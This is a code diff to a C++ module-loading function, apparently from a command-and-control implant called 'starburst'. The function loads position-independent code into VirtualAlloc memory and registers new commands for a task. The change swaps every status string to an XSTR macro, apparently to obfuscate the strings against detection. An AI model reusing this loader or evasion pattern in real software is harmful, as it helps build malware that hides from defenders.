@@ -22,13 +22,13 @@ auto declfn starburst::cmd_load(
 
     if ( !module_data || module_len <= 4 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no module data provided" ) ) );
+            XSTR( "no module data provided" ) );
         return;
     }
 
     if ( inst.loaded.module_count >= MAX_LOADED_MODULES ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "max modules loaded" ) ) );
+            XSTR( "max modules loaded" ) );
         return;
     }
 
@@ -38,7 +38,7 @@ auto declfn starburst::cmd_load(
 
     if ( init_offset >= pic_len ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "invalid init offset" ) ) );
+            XSTR( "invalid init offset" ) );
         return;
     }
 
@@ -50,7 +50,7 @@ auto declfn starburst::cmd_load(
 
     if ( !mem ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "VirtualAlloc failed" ) ) );
+            XSTR( "VirtualAlloc failed" ) );
         return;
     }
 
@@ -63,7 +63,7 @@ auto declfn starburst::cmd_load(
     if ( slots_available == 0 ) {
         inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no command slots available" ) ) );
+            XSTR( "no command slots available" ) );
         return;
     }
 
@@ -78,7 +78,7 @@ auto declfn starburst::cmd_load(
     if ( registered <= 0 ) {
         inst.kernel32.VirtualFree( mem, 0, MEM_RELEASE );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "module init failed" ) ) );
+            XSTR( "module init failed" ) );
         return;
     }
 
@@ -91,11 +91,11 @@ auto declfn starburst::cmd_load(
     inst.loaded.module_count++;
 
     char msg[128] = { 0 };
-    str_copy( msg, symbol<char*>( const_cast<char*>( "loaded module: " ) ) );
+    str_copy( msg, XSTR( "loaded module: " ) );
     char num[16];
     int_to_str( num, registered, 10 );
     str_concat( msg, num );
-    str_concat( msg, symbol<char*>( const_cast<char*>( " commands registered" ) ) );
+    str_concat( msg, XSTR( " commands registered" ) );
 
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
 }
